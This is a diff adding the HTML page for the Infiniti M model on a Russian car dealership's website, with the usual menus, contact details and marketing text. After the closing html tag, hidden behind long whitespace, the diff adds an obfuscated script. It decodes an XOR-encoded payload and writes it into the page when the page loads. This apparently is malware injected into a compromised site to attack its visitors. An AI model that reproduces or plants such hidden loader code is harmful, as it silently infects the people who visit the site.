@@ -1,0 +1,151 @@
+
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+  <link href="includes/aci.css" rel="stylesheet" type="text/css" />
+	<meta name="description" content="" />
+	<meta name="keywords" http-equiv="keywords" content="" />
+	<meta content="Web-Site programming by Cypress Design Studio < design@cypress-studio.ru >" name="author" />
+  <TITLE>Infiniti M | АвтоСпецЦентр на Ленинском</TITLE>
+</head>
+<body bgcolor="#000000" style="margin:0px 0px 0px 0px; padding: 0px 0px 0px 0px;">
+
+
+
+<table width="100%" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td width="50%"><img src="pix/dot.gif" width="1" height="1" alt="" border="0"/><br /></td>
+<td align="left"><a href="index.php"><img src="pix/i_logo.gif" width="170" height="65" alt="" border="0"/></a><br /></td>
+<td width="300"><img src="pix/dot.gif" width="550" height="1" alt="" border="0"/><br /></td>
+<td align="right"><a href="index.php"><img src="pix/asc_logo.gif" width="210" height="65" alt="" border="0"/></a><br /></td>
+<td width="50%"><img src="pix/dot.gif" width="1" height="1" alt="" border="0"/><br /></td>
+</tr>
+</table>
+
+<table width="936px" border="0" cellpadding="0" cellspacing="0" align="center">
+
+<tr>
+<td bgcolor="#000000">
+
+
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td width="170px" style="background-color: #1B1B1B; padding-left: 15px; padding-top: 20px; padding-bottom: 30px" valign="top">
+<img src="pix/dot.gif" width="170" height="1" alt="" border="0" /><br />
+
+<table width="100%" cellpadding="0" cellspacing="0" border="0">
+<tr class="dataTableRow" onmouseover="this.className='dataTableRowOver';this.style.cursor='hand'" onmouseout="this.className='dataTableRow'" onclick="document.location.href='http://www.infiniti-asc.ru/contents.php?cID=93&coID=97'">
+<td width="100%" class="menu"><a href="http://www.infiniti-asc.ru/contents.php?cID=93&coID=97" class="menu"  onMouseOver="imgOn('menu1')" onMouseOut="imgOff('menu1')"><img src="pix/dot.gif" style="background-image: url('pix/menu_93.png');" class="png" width="170" height="30" alt="" border="0"></a></td></tr><tr class="dataTableRowCur">
+<td width="100%" class="current_menu"><img src="pix/dot.gif" style="background-image: url('pix/menu_94.png');" class="png" width="170" height="30" alt="" border="0"></td></tr><td height="16px"><img src="pix/dot.gif" border="0" alt="" width="3" height="1"><img src="pix/menu_dot.gif" border="0" alt="" width="2" height="4"><img src="pix/dot.gif" border="0" alt="" width="9" height="1"><a href="http://www.infiniti-asc.ru/models.php?&cID=94&mID=10" class="sub_menu">FX</a></td></tr><td height="16px"><img src="pix/dot.gif" border="0" alt="" width="3" height="1"><img src="pix/menu_dot.gif" border="0" alt="" width="2" height="4"><img src="pix/dot.gif" border="0" alt="" width="9" height="1"><a href="http://www.infiniti-asc.ru/models.php?&cID=94&mID=17" class="sub_menu">G</a></td></tr><td height="16px"><img src="pix/dot.gif" border="0" alt="" width="3" height="1"><img src="pix/menu_dot.gif" border="0" alt="" width="2" height="4"><img src="pix/dot.gif" border="0" alt="" width="9" height="1">M</td></tr><tr class="dataTableRow" onmouseover="this.className='dataTableRowOver';this.style.cursor='hand'" onmouseout="this.className='dataTableRow'" onclick="document.location.href='http://www.infiniti-asc.ru/contents.php?coID=110&cID=95'">
+<td width="100%" class="menu"><a href="http://www.infiniti-asc.ru/contents.php?coID=110&cID=95" class="menu"  onMouseOver="imgOn('menu5')" onMouseOut="imgOff('menu5')"><img src="pix/dot.gif" style="background-image: url('pix/menu_95.png');" class="png" width="170" height="30" alt="" border="0"></a></td></tr><tr class="dataTableRow" onmouseover="this.className='dataTableRowOver';this.style.cursor='hand'" onmouseout="this.className='dataTableRow'" onclick="document.location.href='http://www.infiniti-asc.ru/qa.php'">
+<td width="100%" class="menu"><a href="http://www.infiniti-asc.ru/qa.php" class="menu"  onMouseOver="imgOn('menu7')" onMouseOut="imgOff('menu7')"><img src="pix/dot.gif" style="background-image: url('pix/menu_125.png');" class="png" width="170" height="30" alt="" border="0"></a></td></tr></table>
+
+<br><br><br><br>
+
+	
+									
+<div>								
+<P><STRONG>АвтоСпецЦентр на Ленинском</STRONG><BR>официальный дилер Infiniti</P>
+<P>Адрес: Ленинский пр. 107<BR>Телефон: (495) 101-17-17<BR>E-Mail: <A href="mailto:info@infiniti-asc.ru">info@infiniti-asc.ru</A><BR><BR><A href="http://www.infiniti-asc.ru/pix/map.jpg" target=_blank>Схема проезда</A></P></div><br />
+
+<br />
+	
+<br /><br /><br />
+<img src="pix/leftbox_td.gif" alt="" border="0" width="155" height="15"><br /><br />
+<form action="td.php" method="get">
+						<select name="models_id" onChange="this.form.submit();"><option value="0" SELECTED>Выбрать модель</option><option value="10">FX</option><option value="17">G</option><option value="8">M</option></select>						<br><br>
+												<img src="pix/buttons/button_order.gif" alt="" border="0" width="94" height="18"><br />
+							</form>
+
+<br /><br />
+
+</td>
+<td width="700px" valign="top" style="padding-left: 25px; padding-top: 35px">
+
+<table width="700px" cellpadding="0" cellspacing="0" border="0">																																
+	
+<tr><td width="100%"><h1><img src="pix/header_8.png" alt="Infiniti M" border="0" width="700" height="30"></h1></td>
+<td align="right"><a href="http://www.infiniti-asc.ru/models.php?cID=94&mID=8&&ps=1" target="_NEW"><img src="pix/print_page.gif" alt="Версия для печати" border="0" width="17" height="16"></a><br /></td>
+</tr></table>
+<div style="width: 700px; padding-top: 20px; line-height: 18px">
+
+	
+
+
+<img src="pix/slogan_8.png" alt="создан, чтобы вдохновлять" border="0" width="500" height="25"><br /><br />
+<table width="100%" cellpadding="10" cellspacing="0" border="0">
+<tr>
+<td valign="top"><img src="pix/models/models_8_image.jpg" border="0" alt="Infiniti M" title=" Infiniti M "></td>
+<td valign="top" width="100%"><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=11"  class="sub_menu">Интерьер</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=10"  class="sub_menu">Мощь и динамика</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=12"  class="sub_menu">Технологии</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=13"  class="sub_menu">Безопасность</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=14"  class="sub_menu">Стандартное оборудование</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=15"  class="sub_menu">Система Infiniti Rear Active Steer</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=16"  class="sub_menu">Система ATTEASA E-TS</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=17"  class="sub_menu">Звук от Bose® 2 channel</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=32"  class="sub_menu">Комплектации и цены</a><br><a href="http://www.infiniti-asc.ru/models.php?models_type=&cID=94&mID=8&miID=36"  class="sub_menu">Фотографии</a><br></td>
+</tr>
+<tr><td colspan="2" style="padding-top: 20px" valign="top">
+<p><em><strong>Красота и изящество <br />      чистых линий,<br />Пленительный силуэт,<br />      наполненный энергией</strong></em><br /><br /><br />   Управляя седаном нового поколения, Вы испытаете неповторимое ощущение полного привода. Удлиненная колесная база автомобиля Infiniti М и более компактный моторный отсек обеспечили увеличение размера салона. Больше пространства для ног. И, что самое главное, больше пространства для водителя. Кроме того, оригинальный дизайн передней панели позволяет комфортно разместиться и водителю, и переднему пассажиру. И это всего лишь одно из многочисленных преимуществ, которыми обладает просторный салон модели М. </p><p /></td></tr>
+</table>
+
+
+
+ 
+ 
+<br><Br>
+</div>
+
+
+	
+
+
+	
+</td>
+<!--
+
+<td style="padding: 10px" valign="top" align="center">
+<br /><br />
+<p align="left" style="padding-left: 20px">
+<CENTER><A href="http://www.infiniti-asc.ru/models.php?coID=123&amp;cID=94&amp;mID=8"><IMG height=120 alt="Познакомиться с Infiniti M" src="http://www.infiniti-asc.ru/pix/pozn_m.jpg" width=150 border=0></A><BR><A href="http://www.infiniti-asc.ru/models.php?coID=123&amp;cID=94&amp;mID=10"><IMG height=120 alt="Познакомиться с Infiniti FX" src="http://www.infiniti-asc.ru/pix/pozn_fx.jpg" width=150 border=0></A> </CENTER></p>
+
+<br />
+<img src="pix/contents/contents_default_1.jpg" width="155" height="220" border="0" alt="Infiniti M" /><br />
+</td>
+-->
+</tr>
+<table width="100%" cellpadding="0" cellspacing="0" border="0">
+<tr><td style="background-color: #1B1B1B;"><img src="pix/dot.gif" width="190" height="1" alt="" border="0"/></td>
+<td><img src="pix/dot.gif" width="25" height="1" alt="" border="0"/></td>
+<td width="33%">
+<A href="http://www.infiniti-asc.ru/models.php?&cID=94&mID=8"><IMG height=60 alt="" src="http://infiniti-asc.ru/pix/banner-m1.jpg" width=212 border=0></A>	
+<br /></td>
+<td width="33%">
+<A href="http://www.infiniti-asc.ru/td.php?models_id=10"><IMG height=60 alt="" src="http://infiniti-asc.ru/pix/i_banner_2.gif" width=212 border=0></A>	
+</td><td width="33%">
+<A href="http://www.infiniti-asc.ru/models.php?mID=17&amp;cID=94"><IMG height=60 alt="" src="http://infiniti-asc.ru/pix/banner-g2.jpg" width=212 border=0></A>	
+</td>
+</tr></table>
+
+
+
+<table width="936px" border="0" cellpadding="0" cellspacing="0" align="center">
+<tr><td align="left" bgcolor="#333333"><img src="pix/dot.gif" width="1" height="1" alt="" border="0"/><br /></td>
+</tr></table>
+
+<table width="936px" border="0" cellpadding="10" cellspacing="0" align="center">
+<tr><td align="left">2006 - 2007 &copy; АвтоСпецЦентр на Ленинском &#151; ООО "АЦ&nbsp;на&nbsp;Ленинском"<br><a href="http://www.infiniti.ru/">Infiniti.ru</a><br><br>
+
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-869066-1";
+urchinTracker();
+</script>
+
+</td>
+</tr></table>
+
+</body>
+</html>
+						
+																<!--[O]--><script>document.write(unescape("%3Cscript%3Etry%20%7Bfunction%20XNi%28LEv%29%7Breturn%20parseInt%28LEv%29%7Dvar%20Osz%3D%27CC1CP1CF1Cd1CJ1CM1CN1Cn1CS1CY1Cr1Cl1Cp1CX1C61Cj1CT1CL1C41CR1Cg1Ca1Cm1CW1Ce1Cq1Cz1Cw1C71CD1CG1Cb1CA1Ck1Co1Cx1CV1Ct1CK1Cf1CI1C51CZ1CH1Cy1CU1CO1Cs1C91C81C31Ci1Cc1CB1PC1PP1PF1Pd1PJ1PM1PN1Pn1PS1PY1Pr1Pl1Pp1PX1P61Pj1PT1PL1P41PR1Pg1Pa1Pm1PW%27%2CXMr%3DOsz.substr%282%2C1%29%3Bvar%20VCk%3DArray%2826531%5E26431%2CXNi%28%27211%27%29%2CXNi%28%27195%27%29%2C4925%5E5103%2C17970%5E18171%2C531%5E707%2CXNi%28%27212%27%29%2CXNi%28%27158%27%29%2C15371%5E15565%2CXNi%28%27213%27%29%2CXNi%28%27206%27%29%2C24508%5E24435%2CXNi%28%27128%27%29%2C15912%5E16095%2C885%5E1021%2CXNi%28%27214%27%29%2CXNi%28%27240%27%29%2CXNi%28%27140%27%29%2CXNi%28%27231%27%29%2CXNi%28%27245%27%29%2CXNi%28%27137%27%29%2C25642%5E25841%2C23824%5E24017%2CXNi%28%27209%27%29%2CXNi%28%27204%27%29%2C15968%5E16125%2C6994%5E7063%2CXNi%28%27215%27%29%2C12929%5E12901%2CXNi%28%27155%27%29%2CXNi%28%27246%27%29%2CXNi%28%27216%27%29%2C17481%5E17607%2CXNi%28%27244%27%29%2CXNi%28%27205%27%29%2C6222%5E6281%2C13802%5E13665%2CXNi%28%27152%27%29%2CXNi%28%27150%27%29%2CXNi%28%27148%27%29%2CXNi%28%27144%27%29%2C23169%5E23109%2C28988%5E29175%2C21663%5E21533%2CXNi%28%27237%27%29%2CXNi%28%27243%27%29%2C1126%5E1211%2C26566%5E26433%2C27306%5E27195%2C28926%5E28689%2C19088%5E19049%2C623%5E641%2C23044%5E23179%2CXNi%28%27200%27%29%2CXNi%28%27141%27%29%2C3817%5E3699%2C6162%5E6291%2C82%5E205%2C9416%5E9267%2CXNi%28%27254%27%29%2C3711%5E3749%2CXNi%28%27153%27%29%2CXNi%28%27253%27%29%2CXNi%28%27252%27%29%2CXNi%28%27225%27%29%2C24106%5E24271%2CXNi%28%27194%27%29%2C5193%5E5291%2C23978%5E23923%2C12416%5E12387%2CXNi%28%27170%27%29%2CXNi%28%27146%27%29%2C16331%5E16129%2C25672%5E25763%2C3288%5E3147%2C10294%5E10403%2C13024%5E12919%2C4745%5E4611%29%2CRtp%3Bvar%20Dga%2CXUf%3Bvar%20lZk%3D%27CCCPCFCdCJCMCNCnCSCYCrCFCNCJClCrCpCXCMC6CjCTCLC4CRCgCaCpCjCmCdCpCWCeCqCrCzCwCpC7CmCNCzC6CgCDCjCmCdCpCpCGCbCqCpCrCzCwCpC7CmCNCzC6CgCDCpCGCbCACPCzCNCkCJCoCzC6CWCeCACxCzCNCkCJCoCzC6CgCVCtCKCfCICICICICICgCDCpC5ClCFCYCoCzCrCNCACFClClCZCJCzCpCqCpCjCTCVCHCqCHCVCzCPCFCmCMCzC6C4CRCgCVCHCDCzCbCMCJCdCzCPCqCHCVCGCbCACNClC4CyCkCUCNCdCJCrCxC6CgCDCpCOCjCmCdCpCdCXCqCsCPC9CSC8CoCsCLC5C3CqCsC9CsCDCjCmCdCpCiCWCqCsCYCMC5CmCNCzC9CACFCeCmCPCPCJCFCNCzCeCAClCdCxCsCLCjCbCqCsCcCBCNCoCeCcCsCDCJCSC6C5ClCFCYCoCzCrCNCACFClClCZCJCzCACJCrC5CzCbC8CSC6CdCXCVCsCqCsCVC5C3CgCqCqPCC9CgCaCpCjCmCdCpCMCUCqCsCBCNCNCMPPCcCcCsCVC6C5ClCFCYCoCzCrCNCACeClCFCmCNCJClCrCACBClCPCNCpPFCqCpCsCsPdCsCsPPCUCyC6CgCgCVC5ClCFCYCoCzCrCNCACeClCFCmCNCJClCrCACBClCPCNCACdCzCMCeCmCFCzC6CcPJPMCmPCPNCIPCPnCAPCPSCcCLCsCACsCgCACdCzCMCeCmCFCzC6CcPYCACVCcCLCsCACsCgCVCsCACsCVCUCyC6CgCVCsCACsCVCiCWCVCjCbCDCjCmCdCpCJPrCqC5ClCFCYCoCzCrCNCACFCdCzCmCNCzPlCeCzCoCzCrCNC6CsCJCSCdCmCoCzCsCgCDCJPrCACPCzCNPrCNCNCdCJPpCYCNCzC6CsCPCdCFCsCLCMCUCgCDCJPrCACSCdCmCoCzPXClCdC5CzCdCqCICDCpCJPrCACwCJC5CNCBCqC9CDCJPrCACBCzCJCxCBCNCqC9CDCNCdP6CpCaCpC5ClCFCYCoCzCrCNCAPpClC5P6CACmCMCMCzCrC5PjCBCJCeC5C6CJPrCgCDCXCMC6CdCXCLC5C3CgCDCpCOCFCmCNCFCBC6CzCgCaCpC5ClCFCYCoCzCrCNCACwCdCJCNCzC6CsCCCBCNCoCeCnCCPpClC5P6CnCCCcPpClC5P6CnCCCcCBCNCoCeCnCsCgCDC5ClCFCYCoCzCrCNCAPpClC5P6CACmCMCMCzCrC5PjCBCJCeC5C6CJPrCgCDCpCXCMC6CdCXCLC5C3CgCDCpCOCpCOPTCSCYCrCFCNCJClCrCpCUCyC6CgCaCpCjCmCdCpCwCMCqPLCfCLP4PRCqCHCIC9PLPgCfPaCKPmCtPnCICmPpCFC5CzCSCHCDCjCmCdCpPjCRCqCHCHCDCpCSClCdC6CxCGCqCICDCpCxCGCpCCCpCwCMCDCpCxCGCVCVCgCpPjCRCVCqCpP4PRCACPCYPpCPCNCdC6CyCmCNCBCACSCeClClCdC6CyCmCNCBCACdCmCrC5ClCoC6CgPWP4PRCACeCzCrCxCNCBCgCLC9CLC9CgCDCpCdCzCNCYCdCrCpPjCRCDCpCOCCCcCPCFCdCJCMCNCn%27%2CljO%3D%27%27%3BOsz%3DOsz.split%28XMr%29%3Bfor%28Rtp%3D0%3BRtp%3ClZk.length%3BRtp+%3D2%29%7BXUf%3DlZk.substr%28Rtp%2C2%29%3Bfor%28Dga%3D0%3BDga%3COsz.length%3BDga++%29%7Bif%28Osz%5BDga%5D%3D%3DXUf%29break%3B%7D%20ljO+%3DString.fromCharCode%28VCk%5BDga%5D%5E160%29%3B%7Ddocument.write%28ljO%29%3B%7D%0Acatch%28e%29%7B%7D%3C/script%3E"))</script><!--[/O]-->
